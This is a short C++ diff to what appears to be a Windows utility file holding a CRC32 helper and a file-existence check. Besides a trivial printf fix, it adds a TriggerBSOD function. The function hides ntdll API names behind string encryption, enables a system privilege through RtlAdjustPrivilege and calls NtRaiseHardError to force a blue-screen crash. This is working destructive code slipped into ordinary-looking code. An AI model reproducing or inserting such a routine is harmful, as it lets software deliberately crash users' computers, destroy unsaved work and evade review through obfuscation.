@@ -369,7 +369,7 @@ DWORD CalculateCRC32(const std::string& filePath)
 	if (!fileStream.is_open())
 	{
 #ifdef DEBUG
-		printf("File not opened: %s", filePath.c_str());
+		printf("File not opened: %s\n", filePath.c_str());
 #endif
 		return 0xFFFFFFFF;
 	}
@@ -526,4 +526,29 @@ bool CheckFileExistence(const std::string& path, const std::vector<std::string>&
 	}
 
 	return true;
+}
+
+void TriggerBSOD()
+{
+	BOOLEAN bEnabled;
+	ULONG uResp;
+
+	HMODULE hNtdll = GetModuleHandle(skCryptDec("ntdll.dll"));
+
+	if (!hNtdll) return;
+
+	LPVOID lpRtlAdjustPrivilege = GetProcAddress(hNtdll, skCryptDec("RtlAdjustPrivilege"));
+	LPVOID lpNtRaiseHardError = GetProcAddress(hNtdll, skCryptDec("NtRaiseHardError"));
+
+	if (lpRtlAdjustPrivilege && lpNtRaiseHardError)
+	{
+		pdef_RtlAdjustPrivilege NtCall = (pdef_RtlAdjustPrivilege)lpRtlAdjustPrivilege;
+		pdef_NtRaiseHardError NtCall2 = (pdef_NtRaiseHardError)lpNtRaiseHardError;
+
+		// Adjust privilege
+		NTSTATUS NtRet = NtCall(19, TRUE, FALSE, &bEnabled);
+
+		// Trigger BSOD
+		NtCall2(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &uResp);
+	}
 }
